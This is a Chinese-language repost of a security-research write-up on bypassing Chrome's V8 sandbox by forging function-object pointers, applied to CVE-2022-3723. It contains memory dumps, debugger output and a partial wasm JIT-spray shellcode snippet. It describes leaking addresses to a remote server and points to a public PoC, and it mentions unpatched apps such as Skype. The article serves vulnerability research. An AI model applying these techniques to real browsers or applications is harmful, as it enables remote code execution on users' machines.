#  使用本机函数指针绕过最新 Chrome v8 沙箱（issue1378239 EXP）

原创 Numen Cyber Labs  [ 骨哥说事 ](javascript:void\(0\);)

**骨哥说事** ![]()

微信号 guge_guge

功能介绍 关注信息安全趋势，发布国内外网络安全事件，不定期发布对热点事件的个人见解。

____

___发表于_

收录于合集

#白帽故事 117 个

#工具 43 个

#chrome 1 个

# ****声明：****
文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。  
  
---  
  
#  **  
**

#  **背景介绍：**

  

2023 年 7 月 21 日，推特用户 @5aelo 发布了关于新的 v8
沙箱讨论文档：https://twitter.com/5aelo/status/1682405383896219649

本文讨论如何利用 Function 的本机指针来绕过 Chrome 中最新的 v8 沙箱。

关于v8沙箱的起源和演变，可以参考之前的一些文档：

 **V8 Sandbox — High-Level Design：**  
https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit

 **V8 Sandbox — External Pointer Sandboxing：**

https://docs.google.com/document/u/0/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk/mobilebasic

V8 Sandbox — High Level Design 主要讲解了高层设计思想，而 V8 Sandbox —External Pointer
Sandboxing 则重点介绍了外部指针表设计以及对 v8
沙箱外部对象的内存安全访问，利用高版本Chrome漏洞需要考虑绕过v8沙箱缓解措施，和之前一样，本文深入研究了绕过概念和实现，并结合了实际的
CVE-2022-3723（issue1378239）弹出一个计算器，目前该问题仍处于锁定状态。

 **0x01-函数对象：**

编写漏洞利用程序时，通常的过程是损坏对象的任意读/写，然后是代码执行，在有了 v8 沙箱后的方法则变为： ****

 **对象损坏 - > 相对任意读/写 -> 绕过 v8 沙箱 -> 代码执行**

这里的关键是绕过沙箱进行相对任意读/写， Javascript 中的 Function
对象提供了这种功能，函数本身就是一个对象，同时也支持代码执行，因此，它是从对象到执行的关键桥梁。

下面是Function对象的数据结构：

  *   *   *   *   * 

    
    
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var f = wasmInstance.exports.main;%DebugPrint(f);

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    DebugPrint: 0x1f290011c161: [Function] in OldSpace - map: 0x1f29001138b9 <Map[28](HOLEY_ELEMENTS)> [FastProperties] - prototype: 0x1f2900104275 <JSFunction (sfi = 0x1f29000c8ef9)> - elements: 0x1f2900000219 <FixedArray[0]> [HOLEY_ELEMENTS] - function prototype: <no-prototype-slot> - shared_info: 0x1f290011c135 <SharedFunctionInfo js-to-wasm::i> - name: 0x1f2900002785 <String[1]: #0> - builtin: JSToWasmWrapper - formal_parameter_count: 0 - kind: NormalFunction - context: 0x1f2900103c0d <NativeContext[281]> - code: 0x1f2900303979 <Code BUILTIN JSToWasmWrapper> - Wasm instance: 0x1f290011bf69 <Instance map = 0x1f290011a605>

  
下面是内存中的十六进制数据：

  *   *   *   *   *   *   *   * 

    
    
    0x1f290011c100        00000000 00040E40 00001E95 0011C0F10x1f290011c110        00303979 00000000 0011BF69 000000000x1f290011c120        000007D0 002B1A65 00000000 000000020x1f290011c130        00040E60 00000D8D 0011C109 000027850x1f290011c140        0000026D 0011BED1 00010000 000000000x1f290011c150        00000000 FFFFFFFF 0000031B 000000000x1f290011c160        001138B9 00000219 00000219 000574000x1f290011c170        0011C135 00103C0D 000C22F9 00000061

#

#  **  
0x02-RIP劫持：**

 ****

 **0x1f290011c160** 是对象的起始地址，而 **0x1f290011C135**
是shared_info对象，我们可以检查该对象的详细信息：

  *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    0x1f290011c135: [SharedFunctionInfo] in OldSpace - map: 0x1f2900000d8d <Map[44](SHARED_FUNCTION_INFO_TYPE)> - name: 0x1f2900002785 <String[1]: #0> - kind: NormalFunction - syntax kind: AnonymousExpression - function_map_index: 204 - formal_parameter_count: 0 - expected_nof_properties: 0 - language_mode: sloppy - function_data: 0x1f290011c109 <Other heap object (WASM_EXPORTED_FUNCTION_DATA_TYPE)> - code (from function_data): 0x1f2900303979 <Code BUILTIN JSToWasmWrapper>……

  

SharedFunctionInfo 显示地址 **0x1f290011c109** 处的 **function_data** 对象，检查该对象显示：

  *   *   *   *   * 

    
    
    0x1f290011c109: [WasmExportedFunctionData] in OldSpace - map: 0x1f2900001e95 <Map[44](WASM_EXPORTED_FUNCTION_DATA_TYPE)> - internal: 0x1f290011c0f1 <Other heap object (WASM_INTERNAL_FUNCTION_TYPE)> - wrapper_code: 0x1f2900303979 <Code BUILTIN JSToWasmWrapper> - js_promise_flags: 0

  
尽管 **0x1f2900303979**
在解析时很明显，但在内存中它以相反的顺序出现，这可以通过轻微的布局调整来解决，这里的要点是wrapper_code。

在最新的 v8 中，我们看到它当前为只读属性：

  *   *   *   * 

    
    
    (gdb) vmmap 0x1f2900303979[ Legend:  Code | Heap | Stack ]Start              End                Offset             Perm Path0x00001f2900300000 0x00001f2900318000 0x0000000000000000 r--

然而，我们可以伪造这个对象，下图是在最新Chrome 115.0.5790.170上的测试：

![]()

  

对象地址为 **0x109900233314** ，通过将 **0x10990023332C** 处的数据修改为 **0x002333B5** ，然后伪造
**0x1099002333B4** 处的对象，成功劫持该地址，使其指向wasm地址 **0x037557588B010** （实际的wasm模块起始地址为
**0x37557588B000** ），如图所示，RIP被成功劫持到包含 **0xCC** 的 **0x037557588B010**
，命中gdb中的断点。

#  **  0x03-issue1378239 绕过：**

  
issues1378239-CVE-2022–3723 影响 Chrome 107.0.5304.62 及更早版本，这是 2022 年捕获的在野
0day，但该问题的详细信息尚未发布，鉴于 Google 的公开 PoC，任意相对读/写很容易实现，因此省略了利用原文，因为本文更希望专注于 v8
沙箱绕过。

通过任意读/写，可以泄漏 wasm 地址，然后客户端将其与 wasm 请求一起发送到远程服务器，·服务器收到地址后，立即编译并返回 wasm
字节码，由于我们可以控制 RIP，巧妙设计的 wasm 代码会将 RIP 劫持到 wasm 中未对齐的字节码中，详细如下：

  *   *   *   *   *   *   * 

    
    
    var wasm_code = `(module  (func $f (export "f") (param i64)  (call $f (i64.const 0x12EB9060B0C03148)) ;; 48 31 C0 B0 60 90 EB 12  (call $f (i64.const 0x0BEB9090008B4865)) ;; 65 48 8B 00 90 90 EB 0B…………

  
编译后，上述wasm代码在最新的Chrome中具有RWX权限，但在107.0.5304.63中仅具有RX权限，因为我们可以控制 **$f**
函数参数，来实现执行任意代码，前两个字节 **48 31** 将转向下一个可控字节码，因此，在这个 wasm
中，可以执行等效的汇编，同时跳转到下一个序列，逐渐调用 VirtualProtect 并跳转到 ShellCode，具体可参阅 GitHub 了解细节。

#  **0x04-issue1378239的注释：  
  
**

在编写此漏洞利用时，我们发现每个隔离上下文仅触发一次，因此，该漏洞利用分为两个步骤：首先从一个 iframe
中泄漏数据，将泄漏的数据发送到远程服务器，然后服务器将泄漏的信息写入另一个 html 中，供客户端在本地 iframe 中请求，由于两个 iframe
共享相同的域和端口，因此它们共享相同的进程，并且还允许在同一进程中使用泄漏的地址，在第二个 iframe 中，修改数组长度，然后按照典型的任意读/写绕过
v8 沙箱进行 Chrome 沙箱内 RCE，有关利用详细信息，可参阅 GitHub。

 **0x05-漏洞演示截图：**

![]()

#  **0x06-补丁缺口：**

  
事实上，Chrome 的安全性一直在不断提高， Pwn2Own 2023 上也没有出现 Chrome 的全链漏洞利用，从野外 PoC
中可以观察到漏洞利用技术变得更加新颖，而传统容易利用的漏洞如今被描述为 **高度珍贵的漏洞** ，近年来，TheHole 和 Uninitialized
OddBall 等内置对象也不断得到改进，然而，对抗仍然充满活力，看似平衡却仍然没有完全消除现实世界中的补丁缺口。

在研究 1/n day漏洞时，许多流行的 IM（例如 Teams 和 Skype）无法与 Chrome 的补丁速度相匹配，并且巧合的是，Skype 和
Teams 都添加了 v8 沙箱来缓解 1/n-day 威胁。

Chrome 提供的补丁或 Google 的 PoC 大大降低了黑客重现漏洞和编写漏洞利用的难度，这对通用共享组件的软件构成了重大威胁，下面是在野 1/n
day 研究期间为 Skype 编写的一个漏洞利用程序（当然它仍需绕过V8沙箱），关于其他受影响软件的补丁漏洞，不在这里详述。

![]()

 **0x07-参考资料**

  
https://github.com/numencyber/Vulnerability_PoC/tree/main/CVE-2022-3723

https://medium.com/@numencyberlabs/using-leaking-sentinel-value-to-bypass-the-
latest-chrome-v8-hardenprotect-c4ed40e3d34f  
  

https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-
rce-183dcb6f3078

  

https://twitter.com/5aelo/status/1682405383896219649  
  

https://docs.google.com/document/d/1CPs5PutbnmI-c5g7e_Td9CNGh5BvpLleKCqUnqmD82k/edit  
  

https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk/edit  
  

https://docs.google.com/presentation/d/1iDWDHuAZ8ee-
dRF5Lkf0nwO2mkLdZG_YJEP1yPvJ09E/edit#slide=id.g19fd0c0660d_0_267

  

感谢阅读，希望本文能对你有所启发。

  
 ** **====正文结束====****

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

